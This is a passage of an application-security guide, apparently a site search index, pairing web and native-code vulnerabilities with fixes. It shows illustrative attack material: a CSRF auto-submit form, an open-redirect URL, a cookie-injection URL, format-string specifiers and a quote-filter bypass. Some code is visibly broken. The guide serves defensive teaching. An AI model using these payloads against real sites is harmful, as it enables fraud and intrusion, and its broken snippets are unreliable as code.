</ul>"},{"location":"appsec/WAHH/#5-access-control-vulnerabilities-missing-function-level-access-control","title":"5. Access Control Vulnerabilities (Missing Function Level Access Control)","text":"<p>Access control vulnerabilities occur when an application fails to properly enforce restrictions on what authenticated users can do or access. This can lead to horizontal privilege escalation (accessing other users' data at the same privilege level) or vertical privilege escalation (accessing functions or data reserved for higher-privileged users).</p>"},{"location":"appsec/WAHH/#unprotected-functionality-vertical-privilege-escalation","title":"Unprotected Functionality (Vertical Privilege Escalation)","text":"<ul> <li> <p>Description / Definition: This vulnerability allows a lower-privileged user to access functionality or pages intended for higher-privileged users (e.g., administrative functions) by directly navigating to the URL or manipulating parameters, without proper server-side authorization checks.</p> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>An administrative page (e.g., <code>/admin/users.jsp</code>) that can be accessed by a regular user simply by typing the URL, even if there's no link to it in their UI.</li> <li>Client-side JavaScript or HTML comments containing references to hidden administrative URLs or API methods.</li> </ul> </li> <li> <p>Root Cause: The root cause is the reliance on client-side controls (e.g., hiding links, disabling buttons) for enforcing access control, or the absence of robust server-side authorization checks for every request to sensitive functionality. Developers might assume that if a function is not linked, it cannot be accessed.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Server-Side Enforcement: All access control decisions must be enforced on the server-side. Client-side controls should only be used for UI/UX, not security.</li> <li>Per-Function Authorization: Implement explicit authorization checks for every sensitive function or resource, verifying the user's role and permissions before executing the action or returning data.</li> <li>Role-Based Access Control (RBAC): Use a robust RBAC model, where access is granted based on assigned roles, and these checks are performed at every access point.</li> <li>Least Privilege: Applications should always apply the principle of least privilege, granting users only the minimum necessary permissions for their tasks.</li> </ol> </li> <li> <p>Corrected Code Example:     (Representative example, demonstrating server-side check)     <pre><code>// Java example for server-side authorization check (representative)\npublic void adminPage(HttpServletRequest request, HttpServletResponse response) {\n    if (!request.getSession().getAttribute(\"userRole\").equals(\"admin\")) { // Server-side role check\n        response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Access Denied\");\n        return;\n    }\n    // Proceed with administrative functionality\n}\n</code></pre></p> </li> <li> <p>Explanation of Fix: Enforcing access control on the server-side means that even if an attacker bypasses client-side restrictions or guesses URLs, the server will independently verify their authorization, denying access if privileges are insufficient. Per-function authorization ensures that no sensitive action is left unprotected, preventing unauthorized users from invoking them.</p> </li> </ul>"},{"location":"appsec/WAHH/#insecure-direct-object-reference-horizontal-privilege-escalation","title":"Insecure Direct Object Reference (Horizontal Privilege Escalation)","text":"<ul> <li> <p>Description / Definition: Insecure Direct Object Reference (IDOR) vulnerabilities occur when an application exposes a direct reference to an internal implementation object (like a file, database key, or directory) and allows a user to manipulate this reference to access resources they are not authorized to view or modify, typically belonging to another user at the same privilege level.</p> </li> <li> <p>Vulnerable Behavior Example: <pre><code>// Java example from OWASP Guide\nString query = \"SELECT * FROM accts WHERE account = ?\"; // Uses parameter for account number\nPreparedStatement pstmt = connection.prepareStatement(query, ...);\npstmt.setString(1, request.getParameter(\"acct\")); // Untrusted 'acct' parameter\nResultSet results = pstmt.executeQuery();\n</code></pre>     An attacker might change the <code>acct</code> parameter in the URL (e.g., <code>viewinvoice.jsp?acct=12345</code>) to <code>viewinvoice.jsp?acct=67890</code> to access another user's account without proper authorization checks.</p> </li> <li> <p>Root Cause: The root cause is the application's failure to implement proper authorization checks to verify if the user requesting a resource is indeed authorized to access that specific resource, especially when the resource is identified by user-controlled input. The application assumes that direct object references provided by the user are always legitimate.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Per-Resource Authorization: For every request involving a direct object reference, the application must perform an authorization check to confirm the user is authorized for that specific object.</li> <li>Indirect Object References: Use indirect object references (e.g., a per-session, per-user, or randomly generated index) instead of direct database keys or file names in URLs or parameters. Map these indirect references to the actual objects on the server-side.</li> <li>Input Validation: Ensure any untrusted input used to reference objects is properly understood and used by the server-side code, although authorization is the primary defense.</li> </ol> </li> <li> <p>Explanation of Fix: Per-resource authorization checks ensure that even if an attacker guesses valid object IDs, they will only be granted access if their authenticated session is explicitly linked to that resource. Indirect object references make it harder for attackers to guess valid resource identifiers, adding an additional layer of security, though the server-side authorization check remains the critical control.</p> </li> </ul>"},{"location":"appsec/WAHH/#6-security-misconfiguration","title":"6. Security Misconfiguration","text":"<p>Security Misconfiguration refers to vulnerabilities arising from improperly configured security settings across the application stack, including web servers, application servers, databases, frameworks, and custom code.</p> <ul> <li> <p>Description / Definition: This category includes vulnerabilities due to:</p> <ul> <li>Default accounts or credentials that are left unchanged.</li> <li>Default or unnecessary content (e.g., sample applications, development files) exposed in production environments.</li> <li>Improper permissions on files and directories.</li> <li>Missing security hardening (e.g., disabling unneeded services, insecure error handling).</li> </ul> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>A production server with default admin username/password (e.g., <code>admin/admin</code>).</li> <li>Default sample applications like Apache Tomcat's \"Sessions Example\" script that exposes session variables.</li> <li>Directory listings enabled on web servers, allowing attackers to browse file structures.</li> <li>Insecure error handling disclosing sensitive debug information.</li> </ul> </li> <li> <p>Root Cause: The root cause is often a lack of awareness or oversight during deployment, where default, insecure settings are not changed, or unnecessary components are left exposed. It can also stem from complex frameworks with many configurable options, making it difficult to secure everything correctly.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Secure Installation and Hardening: Follow secure installation guides and hardening checklists for all components (OS, web server, application server, database, frameworks).</li> <li>Change Defaults: Change all default credentials and remove any default accounts not strictly required.</li> <li>Remove Unnecessary Features/Content: Remove or disable all unused features, components, services, and default content (e.g., sample applications, old files, debug functionality) from production servers.</li> <li>Principle of Least Privilege: Configure all accounts, processes, and file/directory permissions with the minimum necessary privileges.</li> <li>Secure Error Handling: Implement generic error pages and ensure verbose error messages or stack traces are not displayed to users. Logs containing sensitive information should be stored server-side and secured.</li> <li>Automated Security Scans: Regularly run automated security misconfiguration scans to identify deviations from secure baselines.</li> </ol> </li> <li> <p>Explanation of Fix: Hardening and removing defaults eliminate easy entry points for attackers who rely on common configurations. Least privilege minimizes the impact if a component is compromised. Secure error handling prevents information leakage that attackers can use to fine-tune attacks. These measures create a more robust and smaller attack surface for the application.</p> </li> </ul>"},{"location":"appsec/WAHH/#7-sensitive-data-exposure-cryptographic-flaws","title":"7. Sensitive Data Exposure (Cryptographic Flaws)","text":"<p>Sensitive Data Exposure occurs when applications fail to adequately protect sensitive data (e.g., financial information, PII, passwords) both at rest and in transit. This often stems from improper implementation of cryptographic controls.</p> <ul> <li> <p>Description / Definition: Vulnerabilities include:</p> <ul> <li>Use of non-standard cryptographic algorithms or custom implementations.</li> <li>Use of cryptographically insecure standard algorithms (e.g., DES, MD5 for passwords without salting).</li> <li>Insecure key management (e.g., hardcoding keys, weak key sizes, improper key storage).</li> <li>Lack of encryption for sensitive data in storage or transit.</li> </ul> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>A custom hashing algorithm implemented by a developer instead of well-vetted library functions.</li> <li>Storing passwords using MD5 without a unique salt per password.</li> <li>Hardcoding encryption keys within the application source code.</li> </ul> </li> <li> <p>Root Cause: The root cause is typically a lack of cryptographic expertise among developers, leading them to implement weak or incorrect cryptographic practices, or choose outdated/insecure algorithms. Developers may \"roll their own\" crypto instead of using well-vetted, standard libraries.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Use Standard, Strong Algorithms: Always use standard, cryptographically strong algorithms (e.g., AES for encryption, SHA-256/SHA-512 for hashing with proper salting, modern KDFs like PBKDF2, bcrypt, scrypt, Argon2 for password storage).</li> <li>Never \"Roll Your Own Crypto\": Never implement custom cryptographic algorithms; instead, use functions provided by the language, framework, or common (trusted) cryptographic libraries.</li> <li>Secure Key Management: Implement secure practices for generating, storing, and managing cryptographic keys. Avoid hardcoding keys.</li> <li>Encrypt Data at Rest and in Transit: Ensure sensitive data is encrypted both when stored (at rest) and when transmitted (in transit) using strong encryption protocols like TLS.</li> <li>Regularly Update Crypto Libraries: Keep cryptographic libraries and implementations up-to-date to benefit from security patches and new best practices.</li> </ol> </li> <li> <p>Corrected Code Example: (Illustrates concept of using a trusted library for hashing)     <pre><code>// Java example for secure hashing using a standard library (conceptual, specific library not in source)\n// Avoids custom hash functions or simple MD5/SHA-1 without salting.\npublic String hashPasswordSecurely(String password) throws NoSuchAlgorithmException, InvalidKeySpecException {\n    // Example: Using PBKDF2 (requires proper salt generation and iteration count)\n    SecureRandom random = new SecureRandom();\n    byte[] salt = new byte;\n    random.nextBytes(salt);\n\n    PBEKeySpec spec = new PBEKeySpec(password.toCharArray(), salt, 65536, 256); // High iteration count, key length\n    SecretKeyFactory factory = SecretKeyFactory.getInstance(\"PBKDF2WithHmacSHA256\");\n    byte[] hash = factory.generateSecret(spec).getEncoded();\n\n    // Store salt and hash securely\n    return Base64.getEncoder().encodeToString(salt) + \":\" + Base64.getEncoder().encodeToString(hash);\n}\n</code></pre></p> </li> <li> <p>Explanation of Fix: Relying on standard, well-vetted cryptographic libraries ensures that the algorithms and their implementations have been rigorously tested and are resistant to known attacks. Secure key management prevents attackers from accessing the \"keys to the kingdom\" even if they gain some level of system access. Proper hashing with salts and adaptive functions for passwords and encryption for other sensitive data protects against brute-force, rainbow table, and decryption attacks.</p> </li> </ul>"},{"location":"appsec/WAHH/#8-cross-site-request-forgery-csrf","title":"8. Cross-Site Request Forgery (CSRF)","text":"<ul> <li> <p>Description / Definition: Cross-Site Request Forgery (CSRF) is an attack that forces an authenticated end-user to submit an unwanted request to a web application they are currently authenticated to. Unlike XSS, CSRF attacks target the application's functionality, not its users directly, by leveraging the trust the application has in the user's browser.</p> </li> <li> <p>Vulnerable Behavior Example: (Representative, based on's explanation)     A banking application allows a user to transfer funds via a POST request that looks like:     <code>POST /transfer HTTP/1.1</code> <code>Cookie: sessionid=abc...</code> <code>amount=1000&amp;account=attacker_account</code></p> <p>If this request doesn't include any unpredictable tokens, an attacker can create a malicious HTML page: <pre><code>&lt;!-- Malicious HTML page --&gt;\n&lt;form action=\"http://bank.com/transfer\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"amount\" value=\"1000\"&gt;\n    &lt;input type=\"hidden\" name=\"account\" value=\"attacker_account\"&gt;\n    &lt;input type=\"submit\" value=\"Click me!\"&gt;\n&lt;/form&gt;\n&lt;script&gt;\n    document.forms.submit(); // Auto-submits the form\n&lt;/script&gt;\n</code></pre> If a logged-in user visits this page, the form is submitted to <code>bank.com</code> with the user's session cookie, performing the transfer.</p> </li> <li> <p>Root Cause: The root cause is that the application relies solely on session cookies for tracking user sessions and does not include any unique, unpredictable, and user-specific token in sensitive requests to verify that the request originated from the legitimate user's browser. Browsers automatically include session cookies with cross-site requests, which the application implicitly trusts.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Anti-CSRF Tokens (Synchronizer Token Pattern): The primary defense is to include a unique, unpredictable, and cryptographically strong anti-CSRF token in every state-changing request. This token should be generated server-side, associated with the user's session, and validated on the server. It should be placed in hidden form fields or custom HTTP headers, not in cookies.</li> <li>SameSite Cookie Attribute: Use the <code>SameSite</code> cookie attribute (<code>Lax</code> or <code>Strict</code>) to instruct browsers to restrict sending cookies with cross-site requests. (This is not explicitly in the sources but is a modern related best practice.)</li> <li>Referrer Header Validation: While not a standalone defense, checking the <code>Referer</code> header can offer some protection, but it can be bypassed.</li> <li>Re-authentication: For highly sensitive actions, requiring the user to re-authenticate can mitigate CSRF.</li> </ol> </li> <li> <p>Corrected Code Example: (Representative)     <pre><code>&lt;!-- HTML form with anti-CSRF token --&gt;\n&lt;form action=\"/transfer\" method=\"POST\"&gt;\n    &lt;input type=\"hidden\" name=\"amount\" value=\"1000\"&gt;\n    &lt;input type=\"hidden\" name=\"account\" value=\"attacker_account\"&gt;\n    &lt;input type=\"hidden\" name=\"csrf_token\" value=\"GENERATED_SERVER_SIDE_TOKEN\"&gt; &lt;!-- Anti-CSRF token --&gt;\n    &lt;input type=\"submit\" value=\"Transfer Funds\"&gt;\n&lt;/form&gt;\n</code></pre>     On the server, before processing the transfer:     <pre><code>// Java example for server-side CSRF token validation (representative)\nString submittedToken = request.getParameter(\"csrf_token\");\nString sessionToken = request.getSession().getAttribute(\"csrf_token\");\n\nif (submittedToken == null || !submittedToken.equals(sessionToken)) {\n    response.sendError(HttpServletResponse.SC_FORBIDDEN, \"Invalid CSRF token\");\n    return;\n}\n// Proceed with funds transfer\n</code></pre></p> </li> <li> <p>Explanation of Fix: An anti-CSRF token acts as a secret shared only between the legitimate user's browser and the server for a specific request. When a malicious request is forged, the attacker cannot obtain this secret token (due to the same-origin policy), so the forged request will lack the valid token, and the server will reject it. This breaks the trust relationship that CSRF attacks exploit.</p> </li> </ul>"},{"location":"appsec/WAHH/#9-unvalidated-redirects-and-forwards","title":"9. Unvalidated Redirects and Forwards","text":"<ul> <li> <p>Description / Definition: Unvalidated Redirects and Forwards allow an attacker to redirect or forward a user to an arbitrary, untrusted URL based on unvalidated user input. This can be used for phishing attacks, malware distribution, or to bypass access controls for internal forwards.</p> </li> <li> <p>Vulnerable Code Example: <pre><code>// Java example from OWASP Guide\nString url = request.getParameter(\"url\"); // User-controlled 'url' parameter\nresponse.sendRedirect(url); // Vulnerable, redirects to arbitrary URL\n</code></pre>     An attacker could submit <code>?url=http://malicious.com</code> to redirect the victim.</p> </li> <li> <p>Root Cause: The root cause is the application's failure to validate user-supplied input used to determine redirect or forward destinations. The application implicitly trusts that the provided URL or path is safe.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Whitelist Destinations: All redirects/forwards must be constructed based on a whitelist of known, safe destinations.</li> <li>Relative Paths: Use relative paths for redirects whenever possible to ensure the user stays on the trusted site.</li> <li>Strict Input Validation: If external redirects are necessary, strictly validate the user-supplied URL to ensure it matches allowed patterns and does not contain malicious schemes or hosts.</li> </ol> </li> <li> <p>Corrected Code Example: <pre><code>// Java example with whitelist validation (representative)\nString urlParam = request.getParameter(\"url\");\nList&lt;String&gt; allowedUrls = Arrays.asList(\"/home\", \"/profile\", \"/logout\"); // Whitelist of relative paths\n\nif (allowedUrls.contains(urlParam)) {\n    response.sendRedirect(urlParam); // Safe redirect to known internal path\n} else {\n    response.sendRedirect(\"/error\"); // Redirect to a safe default page\n}\n</code></pre></p> </li> <li> <p>Explanation of Fix: A whitelist ensures that the application will only redirect or forward to predefined, trusted locations, preventing an attacker from arbitrarily sending users to malicious sites. Using relative paths further constrains redirects to within the current application, reducing the scope of potential attacks.</p> </li> </ul>"},{"location":"appsec/WAHH/#10-application-logic-flaws","title":"10. Application Logic Flaws","text":"<p>Application logic flaws (also known as business logic flaws) are defects in an application's design or implementation that allow an attacker to subvert the intended workflow or rules of the application to achieve unauthorized outcomes. These are highly varied and often unique to each application's specific functionality.</p> <ul> <li> <p>Description / Definition: Logic flaws can manifest in many ways, including:</p> <ul> <li>Bypassing multi-stage processes by skipping steps or submitting requests out of sequence.</li> <li>Invalidating input validation by exploiting the order or recursion of validation steps (e.g., truncation after sanitization).</li> <li>Abusing search functions to infer sensitive data not directly accessible.</li> <li>Exploiting race conditions where concurrent requests can lead to unintended states.</li> <li>Trust boundary violations where components implicitly trust data from other, less-secured components.</li> </ul> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>Bypassing multi-stage process: A \"password change\" function that requires current password, new password, and confirmation, but can be bypassed by omitting the \"current password\" parameter.</li> <li>Invalidating input validation: An application filters single quotes then truncates input. An attacker submits <code>admin'--</code> which becomes <code>admin''--</code>. If the filter is applied, but then truncation cuts off some of the escaping, it might become <code>admin'</code> again, leading to SQL Injection.</li> <li>Abusing Search: A search function for \"public documents\" also indexes \"private documents\". Searching for parts of private documents reveals their existence or content through hits, even if the user can't view them directly.</li> </ul> </li> <li> <p>Root Cause: The root cause is typically flawed assumptions made by designers or developers about user behavior, data integrity, or the interaction between different application components. They fail to consider how an attacker might intentionally violate these assumptions. Complex applications with multiple developers and layered logic are particularly susceptible.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Thorough Design Documentation: Document every aspect of the application's design, including all assumptions made by developers and designers.</li> <li>Clear Code Comments: Comment source code to explain the purpose of components, their assumptions, and client code dependencies.</li> <li>Strict State Management: For multi-stage processes, strictly enforce the expected sequence of steps and reject out-of-sequence requests. Use server-side state machines.</li> <li>Validate All Input: Understand how input validation interacts with other data transformations (truncation, encoding) and ensure robust validation at all layers, not just at the entry point.</li> <li>Test Trust Boundaries: Explicitly define and test trust boundaries between application components. Treat data from adjacent components with the same skepticism as external user input.</li> <li>Review Search Indexing: Ensure search functions only index data appropriate for the user's privilege level, and that results do not allow inference of unauthorized data.</li> <li>Systematic Logic Testing: Conduct systematic probing and lateral thinking to test the application's behavior in response to unexpected input or sequence changes.</li> </ol> </li> <li> <p>Explanation of Fix: Thorough documentation and clear code comments help prevent flawed assumptions from being introduced or remaining undetected. Strict server-side state management ensures that business processes are followed correctly, preventing attackers from skipping steps or manipulating workflows. Robust input validation at all stages and explicit trust boundary definitions mitigate issues arising from data transformations or inter-component communication. Ultimately, imaginative and systematic testing is key to uncovering these subtle flaws.</p> </li> </ul>"},{"location":"appsec/WAHH/#11-native-code-vulnerabilities","title":"11. Native Code Vulnerabilities","text":"<p>These vulnerabilities specifically affect applications written in native code languages like C and C++, which do not run in managed execution environments (like Java or .NET). They are low-level memory safety issues that can be exploited for arbitrary code execution or denial of service.</p>"},{"location":"appsec/WAHH/#buffer-overflows","title":"Buffer Overflows","text":"<ul> <li> <p>Description / Definition: Buffer overflows occur when a program attempts to write more data into a fixed-size memory buffer than it can hold, overwriting adjacent memory locations. This can lead to crashes (denial of service), corruption of data, or, in severe cases, arbitrary code execution by overwriting return addresses or other critical program data.</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's general description)     <pre><code>// C example (representative)\nchar buffer; // Fixed-size buffer\nstrcpy(buffer, userinput); // Vulnerable if userinput &gt; 199 characters (plus null terminator)\n</code></pre>     If <code>userinput</code> is larger than 199 characters, <code>strcpy</code> will write beyond <code>buffer</code>'s boundary.</p> </li> <li> <p>Root Cause: The root cause is the use of unsafe C/C++ string or memory manipulation functions (e.g., <code>strcpy</code>, <code>strcat</code>, <code>memcpy</code>, <code>sprintf</code>) that do not perform bounds checking and do not explicitly ensure the destination buffer is large enough for the source data.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Use Bounds-Checking Functions: Always use safe, bounds-checking versions of string/memory functions (e.g., <code>strncpy</code>, <code>strncat</code>, <code>memcpy_s</code>, <code>snprintf</code>) or higher-level abstractions that manage memory safely.</li> <li>Input Length Validation: Validate the length of user input before copying it into fixed-size buffers.</li> <li>Managed Memory Environments: Where possible, develop in languages that use managed memory environments (e.g., Java, C#, Python) where buffer overflows are significantly less common.</li> <li>Compiler Protections: Enable compiler-level protections (e.g., Stack Smashing Protectors like <code>/GS</code> in Visual C++, <code>-fstack-protector</code> in GCC/Clang) [636 (implied)].</li> </ol> </li> <li> <p>Corrected Code Example: (Representative)     <pre><code>// C example with bounds-checking (representative)\nchar buffer;\n// Ensure userinput_len is properly calculated and does not exceed buffer size\nstrncpy(buffer, userinput, sizeof(buffer) - 1); // Copies at most size-1 characters\nbuffer[sizeof(buffer) - 1] = '\\0'; // Ensure null termination\n</code></pre></p> </li> <li> <p>Explanation of Fix: Bounds-checking functions explicitly prevent writing beyond the allocated buffer size, truncating input if necessary, thereby eliminating the overflow condition. Input validation ensures that malicious overlong input is detected and rejected early. Using managed languages offloads memory management to a runtime, eliminating common low-level memory errors.</p> </li> </ul>"},{"location":"appsec/WAHH/#integer-vulnerabilities","title":"Integer Vulnerabilities","text":"<ul> <li> <p>Description / Definition: Integer vulnerabilities arise from improper handling of integer values within calculations or comparisons, leading to issues like:</p> <ul> <li>Integer Overflow/Underflow: When an arithmetic operation produces a value that is too large (overflow) or too small (underflow) to be stored in the intended integer type, causing it to \"wrap around\".</li> <li>Signedness Errors: Mismatching signed and unsigned integer types in operations or comparisons, leading to unexpected behavior.</li> </ul> </li> <li> <p>Vulnerable Behavior Example: (Representative, based on's explanation)     <pre><code>// C example (representative)\nint numItems = request.getParameter(\"items\"); // User supplies a large number like 2,000,000,000\nint pricePerItem = 2;\nint totalCost = numItems * pricePerItem; // Integer overflow if totalCost exceeds max int value\n// totalCost might wrap around to a negative number, leading to discount or free items\n</code></pre></p> </li> <li> <p>Root Cause: The root cause is insufficient validation of integer inputs and outputs, combined with a lack of awareness of how integer types behave at their boundaries and when different types (signed/unsigned) interact.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Input Range Validation: Validate that user-supplied numerical inputs are within expected safe ranges to prevent overflow/underflow before performing calculations.</li> <li>Use Larger Data Types: Use integer data types that are sufficiently large to hold expected values, or use fixed-precision arithmetic for financial calculations.</li> <li>Careful Signed/Unsigned Comparisons: Be cautious when mixing signed and unsigned integer types in comparisons or arithmetic operations.</li> <li>Error Handling for Arithmetic Operations: Explicitly check for overflow/underflow conditions after sensitive arithmetic operations.</li> </ol> </li> <li> <p>Explanation of Fix: Input range validation prevents attackers from supplying values that would cause integer overflows or underflows. Using appropriately sized data types and explicit checks ensures that calculations do not produce unintended results due to integer wrapping.</p> </li> </ul>"},{"location":"appsec/WAHH/#format-string-bugs","title":"Format String Bugs","text":"<ul> <li> <p>Description / Definition: Format string bugs occur when an application processes user-supplied input as a format string in functions like <code>printf</code> or <code>sprintf</code>. This can allow an attacker to read or write arbitrary memory locations, or even execute arbitrary code, by supplying specially crafted format specifiers (e.g., <code>%x</code>, <code>%n</code>, <code>%s</code>).</p> </li> <li> <p>Vulnerable Code Example: (Representative, based on's explanation)     <pre><code>// C example (representative)\nchar buffer;\nsprintf(buffer, request.getParameter(\"input\")); // Vulnerable: input is directly used as format string\n</code></pre>     If <code>request.getParameter(\"input\")</code> is <code>\"%x%x%x%x\"</code>, it will print stack contents. If it contains <code>%n</code>, it can write to memory.</p> </li> <li> <p>Root Cause: The root cause is passing unvalidated user input directly as the <code>format</code> argument to format string functions. These functions interpret the input as instructions for how to parse and print subsequent arguments, which an attacker can manipulate to access memory or crash the application.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Never Use User Input as Format String: The most effective defense is to never pass user-supplied input as the format argument to <code>printf</code>-style functions.</li> <li>Use Fixed Format String: Always use a fixed, constant format string, and pass user input as separate arguments (e.g., <code>printf(\"%s\", user_input);</code>).</li> <li>Input Validation: Validate and sanitize any user input that might be processed by format string functions to ensure it does not contain format specifiers.</li> </ol> </li> <li> <p>Corrected Code Example: (Representative)     <pre><code>// C example with fixed format string (representative)\nchar buffer;\nsprintf(buffer, \"%s\", request.getParameter(\"input\")); // Secure: user input is treated as a string argument\n</code></pre></p> </li> <li> <p>Explanation of Fix: By using a fixed format string (<code>%s</code>) and passing the user input as a separate argument, the format string function is prevented from interpreting the user's input as its own formatting instructions. Instead, it treats the entire user input as a single string to be printed, effectively neutralizing any malicious format specifiers.</p> </li> </ul>"},{"location":"appsec/WAHH/#12-information-disclosure","title":"12. Information Disclosure","text":"<p>Information Disclosure vulnerabilities occur when an application unintentionally reveals sensitive information to an attacker that could be used to compromise the application or its underlying systems.</p> <ul> <li> <p>Description / Definition: This includes:</p> <ul> <li>Verbose Error Messages: Revealing stack traces, database error messages, internal paths, or debugging information.</li> <li>Source Code Comments: Containing sensitive details like usernames, passwords, \"TODO\" items for security fixes, or internal logic.</li> <li>Directory Listings: Allowing directory browsing on web servers.</li> <li>Insecure Logging: Logging sensitive data (passwords, session IDs, PII) in plaintext logs accessible to attackers.</li> <li>Debug Parameters: Hidden parameters (e.g., <code>debug=true</code>) that, when enabled, expose sensitive information or alter security logic.</li> </ul> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>A database error message exposing parts of the SQL query and database schema (<code>Server: Msg 105, Level 15... Unclosed quotation mark...</code>).</li> <li>A stack trace showing internal class names, file paths, and library versions.</li> <li>A comment in source code: <code>char buf; // I hope this is big enough</code> indicating a potential buffer overflow.</li> <li>An application logging plaintext passwords.</li> </ul> </li> <li> <p>Root Cause: The root cause is generally a lack of security awareness during development and deployment, leading to implicit trust in internal processes or components. Developers may leave debugging features enabled in production, fail to strip sensitive comments, or not configure logging appropriately.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Generic Error Messages: Never return verbose error messages, stack traces, or debug information to the user's browser. Implement a single, generic error page.</li> <li>Secure Logging: Log sensitive information only to a secure, server-side log file that is not publicly accessible. Sanitize all event data to prevent log injection attacks and to remove sensitive data.</li> <li>Remove Debug Functionality: Ensure all debugging functionality, test code, and development-specific content are removed or disabled in production environments.</li> <li>Code Review for Sensitive Comments: Conduct thorough code reviews to identify and remove sensitive comments (e.g., TODOs for security, hardcoded credentials) from production code.</li> <li>Disable Directory Listings: Configure web servers to disable directory listings.</li> <li>Apply Least Privilege: Ensure that accounts and processes run with minimal privileges, limiting the information accessible even if compromised.</li> </ol> </li> <li> <p>Explanation of Fix: Generic error messages deny attackers clues about the application's internal structure or specific vulnerabilities. Secure logging ensures sensitive data remains confidential even if an attack triggers verbose logging. Removing debug features and sensitive comments prevents attackers from leveraging internal developer notes or functionality for exploitation. Disabling directory listings prevents attackers from easily mapping application content.</p> </li> </ul>"},{"location":"appsec/WAHH/#13-cross-domain-data-capture-and-related-client-side-injections","title":"13. Cross-Domain Data Capture (and related Client-Side Injections)","text":"<p>This category covers attacks that leverage application or browser weaknesses to exfiltrate sensitive data across domain boundaries or inject client-side code in unexpected ways, often bypassing the Same-Origin Policy.</p>"},{"location":"appsec/WAHH/#ui-redress-attacks-clickjackingstrokejacking","title":"UI Redress Attacks (Clickjacking/Strokejacking)","text":"<ul> <li> <p>Description / Definition: UI Redress attacks, like clickjacking, trick users into clicking on invisible or disguised elements on a malicious webpage that are actually transparent overlays of elements from another, legitimate site. This can lead to unintended actions on the legitimate site, such as making purchases, changing settings, or revealing sensitive information. Strokejacking is similar but involves keylogging.</p> </li> <li> <p>Vulnerable Behavior Example: (Representative, based on)     A legitimate website allows a one-click purchase button. An attacker loads this site in an invisible iframe on their malicious site and overlays a tempting \"Click here for a free prize!\" button over the purchase button. When the user clicks for the \"prize,\" they unknowingly trigger the purchase on the legitimate site.</p> </li> <li> <p>Root Cause: The root cause is the absence of proper frame-busting defenses (HTTP headers) by the legitimate application, allowing it to be embedded within iframes on other domains.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>X-Frame-Options Header: Implement the <code>X-Frame-Options</code> HTTP header with <code>DENY</code> or <code>SAMEORIGIN</code> values to prevent the page from being embedded in iframes on other domains.</li> <li>Content Security Policy (CSP) <code>frame-ancestors</code> directive: Use CSP's <code>frame-ancestors</code> directive for more granular control over framing.</li> <li>Frame-Busting JavaScript: While less reliable than headers, JavaScript frame-busting code can be used as a secondary defense.</li> </ol> </li> <li> <p>Explanation of Fix: The <code>X-Frame-Options</code> header instructs the browser not to display the page in a frame if it's from a different origin, directly preventing clickjacking attacks by removing the attacker's ability to overlay content.</p> </li> </ul>"},{"location":"appsec/WAHH/#client-side-cookie-injection","title":"Client-Side Cookie Injection","text":"<ul> <li> <p>Description / Definition: Client-side cookie injection allows an attacker to inject arbitrary cookies into a user's browser for a specific domain. This can bypass certain client-side controls or lead to session fixation if the application accepts the injected cookie as a valid session identifier.</p> </li> <li> <p>Vulnerable Behavior Example: (Representative, based on)     An application echoes unvalidated user input into a JavaScript string that is then used to set a cookie.     <pre><code>// JavaScript (representative)\ndocument.cookie = \"user=\" + decodeURIComponent(window.location.hash.substring(1)); // Vulnerable\n</code></pre>     An attacker crafts a URL like <code>http://example.com/page#user=attacker%3B%20sessionid=fixedvalue</code>, which could inject <code>sessionid</code> into the victim's cookies.</p> </li> <li> <p>Root Cause: The root cause is the unvalidated inclusion of user-controlled data into client-side scripts that set cookies, or server-side reflected input that can influence client-side cookie setting.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Strict Client-Side Input Validation: Validate and sanitize all user input used in client-side scripts before it is used to set cookies.</li> <li>Output Encoding: Properly encode user input on the server-side before reflecting it into JavaScript or HTML where it might influence cookie setting.</li> <li>Server-Side Session Fixation Prevention: Implement server-side session fixation prevention by issuing a new session ID after login.</li> </ol> </li> <li> <p>Explanation of Fix: Strict validation and encoding prevent malicious characters from being interpreted as cookie-setting commands in client-side scripts. Server-side session fixation prevention ensures that even if a cookie is injected, it won't be used for an authenticated session.</p> </li> </ul>"},{"location":"appsec/WAHH/#14-shared-hosting-and-architecture-vulnerabilities","title":"14. Shared Hosting and Architecture Vulnerabilities","text":"<p>These vulnerabilities arise from weaknesses in the application's overall architecture, especially in multi-tiered or shared hosting environments. Improper segregation or trust relationships can allow a compromise in one component or application to affect others.</p>"},{"location":"appsec/WAHH/#inadequate-segregation-in-tiered-architectures","title":"Inadequate Segregation in Tiered Architectures","text":"<ul> <li> <p>Description / Definition: In multi-tiered architectures (e.g., web server, application server, database server), inadequate segregation means that a compromise in one tier can lead to compromise of other tiers due to overly permissive trust relationships. For example, if the web application runs with high database privileges, a SQL injection on the web tier can fully compromise the database.</p> </li> <li> <p>Vulnerable Behavior Example:</p> <ul> <li>Web application connecting to the database using the DBA (Database Administrator) account, instead of a least-privileged account.</li> <li>Application server process having file read/write access to MySQL data files.</li> <li>Decryption keys for sensitive data stored on the same tier as the encrypted data.</li> </ul> </li> <li> <p>Root Cause: The root cause is the failure to apply the principle of least privilege across different tiers and components. Implicit trust is often placed between tiers, assuming that a higher-tier component will always properly enforce security controls for lower tiers.</p> </li> <li> <p>Remediation / Secure Fix:</p> <ol> <li>Principle of Least Privilege: Apply the principle of least privilege rigorously across all tiers and components. Each tier should only have the minimum necessary permissions to perform its function.</li> <li>Separate Accounts/Permissions: Use separate, restricted accounts for database access, file system 